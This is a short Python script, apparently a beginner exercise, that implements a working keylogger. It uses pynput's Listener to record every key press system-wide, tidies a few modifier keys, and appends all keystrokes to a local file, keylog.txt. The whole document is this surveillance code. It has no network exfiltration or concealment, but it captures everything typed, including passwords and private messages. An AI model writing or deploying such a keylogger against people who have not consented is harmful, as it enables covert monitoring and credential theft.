# Storing the keystrokes in a file

#File handeling

from pynput.keyboard import Listener


def on_press(key):

    letter = str(key)
    letter = letter.replace("'", "")
    
    if letter == "Key.space":
        letter = " "
    elif letter == "Key.shift_r":
        letter = ""
    elif letter == "Key.shift_l":
        letter = ""
    elif letter == "Key.ctrl_l":
        letter = ""
    elif letter == "Key.ctrl_r":
        letter = ""
  
    with open("keylog.txt", "a") as f:
        f.write(letter)


with Listener(on_press=on_press) as l:
    l.join()